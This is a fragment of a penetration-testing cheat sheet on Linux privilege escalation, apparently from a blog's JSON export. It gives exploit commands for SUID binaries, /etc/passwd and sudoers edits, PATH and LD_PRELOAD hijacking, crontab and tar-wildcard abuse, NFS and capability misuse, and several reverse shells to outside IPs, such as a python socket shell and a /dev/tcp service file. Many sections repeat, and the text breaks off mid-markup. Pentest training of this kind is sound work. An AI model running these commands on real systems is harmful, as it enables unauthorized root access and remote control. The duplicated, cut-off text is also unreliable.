title=\"Files with SUID and SGID bit\"></a>Files with SUID and SGID bit</h2><blockquote>\n<p>SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># suid</span>\nfind / -perm -u=s -<span class=\"built_in\">type</span> f 2&gt;/dev/null\n<span class=\"comment\"># sgid</span>\nfind / -perm -u=g -<span class=\"built_in\">type</span> f 2&gt;/dev/null\n<span class=\"comment\"># both</span>\nfind / -<span class=\"built_in\">type</span> f \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -l &#123;&#125; \\; 2&gt;/dev/null</code></pre>\n<p>Executables you should look for:</p>\n<pre><code class=\"highlight bash\">/usr/bin/passwd\n/usr/bin/sudo\n/bin/su\n/usr/bin/chsh\n/usr/bin/chfn\n/bin/mount\n/bin/umount\n/usr/bin/locate\n/usr/bin/at</code></pre>\n<pre><code class=\"highlight bash\">/usr/bin/newgrp\n/usr/bin/execute\n/usr/bin/gpasswd</code></pre>\n\n<p><strong>Exploit</strong><br>Example with <code>doas</code> executable</p>\n<pre><code class=\"highlight bash\">doas -u root /bin/bash</code></pre>\n\n<br>\n\n<h2 id=\"Edit-etc-passwd\"><a href=\"#Edit-etc-passwd\" class=\"headerlink\" title=\"Edit /etc/passwd\"></a>Edit <code>/etc/passwd</code></h2><blockquote>\n<p><code>/etc/passwd</code> file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"></code></pre>\n\n<p><strong>Exploit</strong><br>Create a user <code>chronos</code> with password <code>chronos</code>. User and group ID are <code>0</code>.</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Append-user-to-sudoers\"><a href=\"#Append-user-to-sudoers\" class=\"headerlink\" title=\"Append user to sudoers\"></a>Append user to sudoers</h2><blockquote>\n<p><code>/etc/sudoers</code> file defines the users who can run commands as <code>root</code>. If we can modify it, we can give our current user privileged permissions.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> visudo -f /etc/sudoers</code></pre>\n\n<p><strong>Exploit</strong><br>Add user to <code>/etc/sudoers</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;username        ALL=(ALL)        NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers</code></pre>\n<p>Possibilities:</p>\n<pre><div class=\"caption\"><span>all commands</span></div><code class=\"highlight bash\">chronos ALL=(ALL:ALL) ALL\nchronos ALL=(root) NOPASSWD: ALL</code></pre>\n<pre><div class=\"caption\"><span>specific command only</span></div><code class=\"highlight bash\">chronos ALL=(root) NOPASSWD: /usr/bin/command</code></pre>\n\n<br>\n\n<h2 id=\"SUDO-permissions-with-preserved-environment\"><a href=\"#SUDO-permissions-with-preserved-environment\" class=\"headerlink\" title=\"SUDO permissions with preserved environment\"></a>SUDO permissions with preserved environment</h2><blockquote>\n<p>You need to set the PATH variable when running the command</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">(root) SETENV: NOPASSWD: command</code></pre>\n\n<p><strong>Exploit</strong><br>Create a custom script named after the <code>nopasswd</code> command</p>\n<pre><code class=\"highlight plaintext\">echo &#x27;/bin/bash -p&#x27; &gt; /tmp/command\nchmod +x /tmp/command</code></pre>\n<p>Run it</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> PATH=/tmp:<span class=\"variable\">$PATH</span> <span class=\"built_in\">command</span></code></pre>\n\n<br>\n\n<h2 id=\"Relative-PATH-call-to-an-executable\"><a href=\"#Relative-PATH-call-to-an-executable\" class=\"headerlink\" title=\"Relative PATH - call to an executable\"></a>Relative PATH - call to an executable</h2><blockquote>\n<p>A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<blockquote>\n<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>\n</blockquote>\n<pre><code class=\"highlight bash\">strings /home/user/vulnerable</code></pre>\n\n<p><strong>Exploit</strong><br>Create a custom executable</p>\n<pre><div class=\"caption\"><span>/tmp/service</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/service.c\ngcc /tmp/service.c -o /tmp/service</code></pre>\n<p>Manipulate the <code>PATH</code> and execute the vulnerable script&#x2F;binary</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> PATH=/tmp:<span class=\"variable\">$PATH</span> <span class=\"comment\"># because our script called service is found in /tmp</span>\n/home/user/vulnerable</code></pre>\n\n<br>\n\n<h2 id=\"Relative-PATH-call-to-a-shell-function\"><a href=\"#Relative-PATH-call-to-a-shell-function\" class=\"headerlink\" title=\"Relative PATH - call to a shell function\"></a>Relative PATH - call to a shell function</h2><blockquote>\n<p>This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<blockquote>\n<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>\n</blockquote>\n<pre><code class=\"highlight bash\">strings /home/user/vulnerable</code></pre>\n\n<p><strong>Exploit</strong><br>Create a malicious function</p>\n<pre><code class=\"highlight bash\"><span class=\"keyword\">function</span> /usr/sbin/service() &#123; <span class=\"built_in\">cp</span> /bin/bash /tmp &amp;&amp; <span class=\"built_in\">chmod</span> +s /tmp/bash &amp;&amp; /tmp/bash -p; &#125;</code></pre>\n<p>Export the function</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> -f /usr/sbin/service</code></pre>\n<p>Run the script&#x2F;binary that calls the service</p>\n<pre><code class=\"highlight bash\">/home/user/vulnerable</code></pre>\n\n<br>\n\n<h2 id=\"LD-PRELOAD-SUID\"><a href=\"#LD-PRELOAD-SUID\" class=\"headerlink\" title=\"LD_PRELOAD SUID\"></a>LD_PRELOAD SUID</h2><blockquote>\n<p>LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target programs shared libraries.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">Matching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD</code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">env</span> <span class=\"comment\"># look for LD_PRELOAD</span></code></pre>\n<pre><div class=\"caption\"><span>/tmp/malicious.c - create a library that overrides the standard one</span></div><code class=\"highlight c\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span>\n\n<span class=\"type\">void</span> _init() &#123;\n    unsetenv(<span class=\"string\">&quot;LD_PRELOAD&quot;</span>);\n    setgid(<span class=\"number\">0</span>);\n    setuid(<span class=\"number\">0</span>);\n    system(<span class=\"string\">&quot;/bin/bash&quot;</span>);\n&#125;</code></pre>\n<pre><div class=\"caption\"><span>compile the shared library</span></div><code class=\"highlight bash\">gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles</code></pre>\n<pre><div class=\"caption\"><span>set the new library</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> LD_PRELOAD=/tmp/malicious.so\n<span class=\"built_in\">printenv</span> LD_PRELOAD</code></pre>\n<pre><div class=\"caption\"><span>run a program such as apache</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> LD_PRELOAD=/tmp/malicious.so apache2</code></pre>\n\n<br>\n\n<h2 id=\"Writable-crontab\"><a href=\"#Writable-crontab\" class=\"headerlink\" title=\"Writable crontab\"></a>Writable crontab</h2><blockquote>\n<p>Define commands that should be executed on the system at regular intervals</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\">(crontab -l; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;* * * * * /bin/echo &#x27;Crontab is writable&#x27; &gt; /tmp/crontab_test&quot;</span>) | crontab -</code></pre>\n\n<p><strong>Exploit</strong><br>Extract attacker IP</p>\n<pre><code class=\"highlight bash\">ip a s</code></pre>\n<p>Add line to crontab (open <code>nano</code> editor)</p>\n<pre><code class=\"highlight bash\">crontab -e</code></pre>\n<pre><div class=\"caption\"><span>crontab command</span></div><code class=\"highlight bash\">* * * * * python3 -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.10&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"Symbolic-link-symlinks\"><a href=\"#Symbolic-link-symlinks\" class=\"headerlink\" title=\"Symbolic link (symlinks)\"></a>Symbolic link (symlinks)</h2><blockquote>\n<p>An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.</p>\n<ol>\n<li>Find a writable directory that is accessible to a user who can exploit it.</li>\n<li>Identify a script or process running as a privileged user that might follow symbolic links.</li>\n<li>Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.</li>\n</ol>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>Find writable directories</span></div><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> d -writable 2&gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>List processes with elevated privileges (e.g., cron jobs)</span></div><code class=\"highlight bash\">ps aux | grep -E <span class=\"string\">&#x27;(crond|atd|systemd|root)&#x27;</span></code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>Create a symlink in a writable directory</span></div><code class=\"highlight bash\"><span class=\"built_in\">cd</span> /tmp\n<span class=\"built_in\">ln</span> -s /etc/passwd /tmp/my_symlink</code></pre>\n<pre><div class=\"caption\"><span>Trigger the privileged process</span></div><code class=\"highlight bash\"><span class=\"built_in\">touch</span> /tmp/my_symlink</code></pre>\n<pre><div class=\"caption\"><span>Verify exploitation</span></div><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -l /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Import-modified-python-module\"><a href=\"#Import-modified-python-module\" class=\"headerlink\" title=\"Import modified python module\"></a>Import modified <code>python</code> module</h2><blockquote>\n<p>Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.</p>\n<ul>\n<li><strong>Identify the target script</strong>: Find a script running as a privileged user that imports modules.</li>\n<li><strong>Writable directory</strong>: Determine if the script imports from a directory writable by non-privileged users.</li>\n<li><strong>Create a malicious module</strong>: Place a malicious module in the writable directory.</li>\n<li><strong>Exploit</strong>: When the script imports the malicious module, it executes the attackers code with elevated privileges.</li>\n</ul>\n</blockquote>\n<p><strong>Test</strong><br>Example: <code>/priv/vuln.py</code> imports a custom module from writable directory <code>/home/user</code></p>\n<pre><div class=\"caption\"><span>/priv/vuln.py</span></div><code class=\"highlight python\"><span class=\"keyword\">import</span> some_module\n...</code></pre>\n<pre><div class=\"caption\"><span>Module search path for this script</span></div><code class=\"highlight bash\">python3 -c <span class=\"string\">&quot;import sys; print(sys.path)&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Example outputs</span></div><code class=\"highlight bash\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8/plat-x86_64-linux-gnu&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8/lib-dynload&#x27;</span>, <span class=\"string\">&#x27;/home/user/.local/lib/python3.8/site-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/local/lib/python3.8/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/home/user&#x27;</span>]</code></pre>\n<p>If one of those is <code>/home/user</code> (the writable directory), we can exploit the vulnerable script.</p>\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>Create a malicious module</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; /home/user/some_module.py</code></pre>\n<pre><div class=\"caption\"><span>Run the privileged script with updated module</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> python3 /priv/vuln.py</code></pre>\n\n\n<br>\n\n<h2 id=\"NFS-no-root-squash-no-all-squash\"><a href=\"#NFS-no-root-squash-no-all-squash\" class=\"headerlink\" title=\"NFS no_root_squash &#x2F; no_all_squash\"></a>NFS <code>no_root_squash</code> &#x2F; <code>no_all_squash</code></h2><blockquote>\n<p><code>no_root_squash</code>: Allows root user on NFS client to retain root privileges on the NFS server.<br><code>no_all_squash</code>: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>command</span></div><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/exports</code></pre>\n<pre><div class=\"caption\"><span>example output</span></div><code class=\"highlight plain\">/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)</code></pre>\n\n<p><strong>Exploit</strong> - 1. attacker machine</p>\n<pre><div class=\"caption\"><span>mount the NFS share</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> /mnt/nfs\nmount -t nfs <span class=\"variable\">$IP</span>:/path/to/share /mnt/nfs</code></pre>\n<pre><div class=\"caption\"><span>create a root-owned file and a SUID shell</span></div><code class=\"highlight bash\"><span class=\"built_in\">touch</span> /mnt/nfs/root_owned_file\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;#!/bin/bash&#x27;</span> &gt; /mnt/nfs/suid_shell\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; /mnt/nfs/suid_shell\n<span class=\"built_in\">chmod</span> +x /mnt/nfs/suid_shell</code></pre>\n<p><strong>Exploit</strong> - 2. victim machine</p>\n<pre><div class=\"caption\"><span>execute the payload</span></div><code class=\"highlight bash\">/mnt/nfs/suid_shell\n/bin/bash -p</code></pre>\n\n<br>\n\n<h2 id=\"Linux-capabilities\"><a href=\"#Linux-capabilities\" class=\"headerlink\" title=\"Linux capabilities\"></a>Linux capabilities</h2><blockquote>\n<p>Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges.<br>This applies to any binary, but well use <code>python</code> as an example.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>list capabilities of binaries on the system</span></div><code class=\"highlight bash\"><span class=\"built_in\">getcap</span> -r / 2&gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>example output</span></div><code class=\"highlight plain\">/usr/bin/python2.6 = cap_setuid+ep</code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>change its user ID to root</span></div><code class=\"highlight bash\">/usr/bin/python2.6 -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n\n<p>Common binaries wih capabilities</p>\n<pre><code class=\"highlight bash\">python3 -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">perl -e <span class=\"string\">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">ruby -e <span class=\"string\">&#x27;exec &quot;/bin/bash&quot;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">gdb -nx -ex <span class=\"string\">&#x27;!sh&#x27;</span> -ex quit</code></pre>\n<pre><code class=\"highlight bash\">cpython -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class=\"built_in\">exec</span>=/bin/bash</code></pre>\n\n<br>\n\n<h2 id=\"tar-wildcard-with-cron-job\"><a href=\"#tar-wildcard-with-cron-job\" class=\"headerlink\" title=\"tar wildcard (with cron job)\"></a><code>tar</code> wildcard (with cron job)</h2><blockquote>\n<p><strong>Wildcards in tar</strong>: When <code>tar</code> encounters filenames starting with <code>--</code>, it treats them as command-line options. This can be exploited to inject tar options like <code>--checkpoint</code> and <code>--checkpoint-action</code>, which can execute arbitrary commands.<br><strong>Cron Job</strong>: The cron job running the vulnerable script executes the <code>tar</code> command periodically, triggering the exploit when the special files are present.</p>\n</blockquote>\n<p><strong>Test</strong><br>Identify the vulnerability</p>\n<pre><div class=\"caption\"><span>example script</span></div><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /home/user/compress.sh</code></pre>\n<pre><div class=\"caption\"><span>compress.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/sh</span>\n<span class=\"built_in\">cd</span> /home/user\ntar czf /tmp/backup.tar.gz *</code></pre>\n<p>Cron job</p>\n<pre><div class=\"caption\"><span>list cron jobs</span></div><code class=\"highlight bash\">crontab -l</code></pre>\n<pre><div class=\"caption\"><span>cron job line</span></div><code class=\"highlight bash\">* * * * * /usr/local/bin/compress.sh</code></pre>\n\n<p><strong>Exploit</strong><br>Create files with names that <code>tar</code> will interpret as options</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># Create a payload script</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/user/runme.sh\n\n<span class=\"comment\"># Create special files to inject `tar` options</span>\n<span class=\"built_in\">touch</span> /home/user/--checkpoint=1\n<span class=\"built_in\">touch</span> /home/user/--checkpoint-action=<span class=\"built_in\">exec</span>=sh\\ runme.sh</code></pre>\n\n<p>Wait for the cron job to execute</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sleep</span> 60\n/tmp/bash -p</code></pre>\n\n<br>\n\n<h2 id=\"Restart-service\"><a href=\"#Restart-service\" class=\"headerlink\" title=\"Restart service\"></a>Restart service</h2><blockquote>\n<p>Locate the config file for the respective service and replace <em>action on reload</em> with a reverse shell</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">(ALL : ALL) /usr/sbin/service vsftpd restart</code></pre>\n\n<p><strong>Exploit</strong><br>View the config file for the service (<code>vsftpd</code> in this example)</p>\n<pre><code class=\"highlight bash\">locate vsftpd.service</code></pre>\n<pre><code class=\"highlight plain\">/etc/systemd/system/multi-user.target.wants/vsftpd.service</code></pre>\n<p>Add the attacker IP in the modified service config (reverse shell).</p>\n<div style=\"display: flex; justify-content: space-between;\">\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Default service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    <pre><code class=\"highlight conf\">[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\nExecReload=/bin/kill -HUP $MAINPID\nExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty\n\n[Install]\nWantedBy=multi-user.target</code></pre>\n    </pre>\n  </div>\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Modified service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    <pre><code class=\"highlight conf\">[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nUser=root\nType=simple\nExecStart=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#x27;\n\n\n[Install]\nWantedBy=multi-user.target</code></pre>\n    </pre>\n  </div>\n</div>\n\n<br>\n\n<h2 id=\"Shell-in-input-prompt\"><a href=\"#Shell-in-input-prompt\" class=\"headerlink\" title=\"Shell in input prompt\"></a>Shell in input prompt</h2><p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>script.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\n<span class=\"built_in\">read</span> -p <span class=\"string\">&quot;What&#x27;s you name: &quot;</span></code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>payload</span></div><code class=\"highlight bash\">/bin/bash -i</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 6 in a penetration test: Privilege escalation.<br>Upgrade permissions, gain access to more resources, become <code>root</code>. </p>\n<hr>","more":"<br>\n\n<h2 id=\"Reverse-shell-from-privileged-python-script\"><a href=\"#Reverse-shell-from-privileged-python-script\" class=\"headerlink\" title=\"Reverse shell from privileged python script\"></a>Reverse shell from privileged python script</h2><pre><code class=\"highlight python\">IP=<span class=\"string\">&quot;10.10.14.10&quot;</span>\nPORT=<span class=\"number\">4444</span>\n<span class=\"keyword\">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),<span class=\"number\">0</span>); os.dup2(s.fileno(),<span class=\"number\">1</span>);os.dup2(s.fileno(),<span class=\"number\">2</span>);<span class=\"keyword\">import</span> pty; pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</code></pre>\n\n<br>\n\n<h2 id=\"Files-with-SUID-and-SGID-bit\"><a href=\"#Files-with-SUID-and-SGID-bit\" class=\"headerlink\" title=\"Files with SUID and SGID bit\"></a>Files with SUID and SGID bit</h2><blockquote>\n<p>SUID (set user ID) and GUID (set group ID) bits are flags set on Linux ELF executables, allowing any user to run them as the owner (impersonate the owner).</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># suid</span>\nfind / -perm -u=s -<span class=\"built_in\">type</span> f 2&gt;/dev/null\n<span class=\"comment\"># sgid</span>\nfind / -perm -u=g -<span class=\"built_in\">type</span> f 2&gt;/dev/null\n<span class=\"comment\"># both</span>\nfind / -<span class=\"built_in\">type</span> f \\( -perm -4000 -o -perm -2000 \\) -<span class=\"built_in\">exec</span> <span class=\"built_in\">ls</span> -l &#123;&#125; \\; 2&gt;/dev/null</code></pre>\n<p>Executables you should look for:</p>\n<pre><code class=\"highlight bash\">/usr/bin/passwd\n/usr/bin/sudo\n/bin/su\n/usr/bin/chsh\n/usr/bin/chfn\n/bin/mount\n/bin/umount\n/usr/bin/locate\n/usr/bin/at</code></pre>\n<pre><code class=\"highlight bash\">/usr/bin/newgrp\n/usr/bin/execute\n/usr/bin/gpasswd</code></pre>\n\n<p><strong>Exploit</strong><br>Example with <code>doas</code> executable</p>\n<pre><code class=\"highlight bash\">doas -u root /bin/bash</code></pre>\n\n<br>\n\n<h2 id=\"Edit-etc-passwd\"><a href=\"#Edit-etc-passwd\" class=\"headerlink\" title=\"Edit /etc/passwd\"></a>Edit <code>/etc/passwd</code></h2><blockquote>\n<p><code>/etc/passwd</code> file contains info about user accounts on the machine. Adding an entry (a line) to this file allows us to create a custom user with predefined UID and GID.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"></code></pre>\n\n<p><strong>Exploit</strong><br>Create a user <code>chronos</code> with password <code>chronos</code>. User and group ID are <code>0</code>.</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;chronos:$1$d7venmwO$dSO1eZg6GvVd/ihQLdb6K/:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Append-user-to-sudoers\"><a href=\"#Append-user-to-sudoers\" class=\"headerlink\" title=\"Append user to sudoers\"></a>Append user to sudoers</h2><blockquote>\n<p><code>/etc/sudoers</code> file defines the users who can run commands as <code>root</code>. If we can modify it, we can give our current user privileged permissions.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> visudo -f /etc/sudoers</code></pre>\n\n<p><strong>Exploit</strong><br>Add user to <code>/etc/sudoers</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;username        ALL=(ALL)        NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers</code></pre>\n<p>Possibilities:</p>\n<pre><div class=\"caption\"><span>all commands</span></div><code class=\"highlight bash\">chronos ALL=(ALL:ALL) ALL\nchronos ALL=(root) NOPASSWD: ALL</code></pre>\n<pre><div class=\"caption\"><span>specific command only</span></div><code class=\"highlight bash\">chronos ALL=(root) NOPASSWD: /usr/bin/command</code></pre>\n\n<br>\n\n<h2 id=\"SUDO-permissions-with-preserved-environment\"><a href=\"#SUDO-permissions-with-preserved-environment\" class=\"headerlink\" title=\"SUDO permissions with preserved environment\"></a>SUDO permissions with preserved environment</h2><blockquote>\n<p>You need to set the PATH variable when running the command</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">(root) SETENV: NOPASSWD: command</code></pre>\n\n<p><strong>Exploit</strong><br>Create a custom script named after the <code>nopasswd</code> command</p>\n<pre><code class=\"highlight plaintext\">echo &#x27;/bin/bash -p&#x27; &gt; /tmp/command\nchmod +x /tmp/command</code></pre>\n<p>Run it</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> PATH=/tmp:<span class=\"variable\">$PATH</span> <span class=\"built_in\">command</span></code></pre>\n\n<br>\n\n<h2 id=\"Relative-PATH-call-to-an-executable\"><a href=\"#Relative-PATH-call-to-an-executable\" class=\"headerlink\" title=\"Relative PATH - call to an executable\"></a>Relative PATH - call to an executable</h2><blockquote>\n<p>A relative PATH vulnerability occurs when a script or binary calls another executable (like service) without specifying its full path. This allows attackers to create a malicious executable with the same name and manipulate the PATH variable to escalate privileges, especially if the vulnerable script is SUID.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<blockquote>\n<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>\n</blockquote>\n<pre><code class=\"highlight bash\">strings /home/user/vulnerable</code></pre>\n\n<p><strong>Exploit</strong><br>Create a custom executable</p>\n<pre><div class=\"caption\"><span>/tmp/service</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/service.c\ngcc /tmp/service.c -o /tmp/service</code></pre>\n<p>Manipulate the <code>PATH</code> and execute the vulnerable script&#x2F;binary</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> PATH=/tmp:<span class=\"variable\">$PATH</span> <span class=\"comment\"># because our script called service is found in /tmp</span>\n/home/user/vulnerable</code></pre>\n\n<br>\n\n<h2 id=\"Relative-PATH-call-to-a-shell-function\"><a href=\"#Relative-PATH-call-to-a-shell-function\" class=\"headerlink\" title=\"Relative PATH - call to a shell function\"></a>Relative PATH - call to a shell function</h2><blockquote>\n<p>This exploit leverages the ability to override a system command with a shell function. When a script or binary calls a command without specifying its full path, you can define a function with the same name to execute malicious code instead. If combined with a SUID binary, this can lead to privilege escalation.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<blockquote>\n<p>Look for scripts&#x2F;binaries calling executables without full paths<br>Imagine <code>/home/user/vulnerable</code> calls the <code>service</code> binary without specifying the full path</p>\n</blockquote>\n<pre><code class=\"highlight bash\">strings /home/user/vulnerable</code></pre>\n\n<p><strong>Exploit</strong><br>Create a malicious function</p>\n<pre><code class=\"highlight bash\"><span class=\"keyword\">function</span> /usr/sbin/service() &#123; <span class=\"built_in\">cp</span> /bin/bash /tmp &amp;&amp; <span class=\"built_in\">chmod</span> +s /tmp/bash &amp;&amp; /tmp/bash -p; &#125;</code></pre>\n<p>Export the function</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">export</span> -f /usr/sbin/service</code></pre>\n<p>Run the script&#x2F;binary that calls the service</p>\n<pre><code class=\"highlight 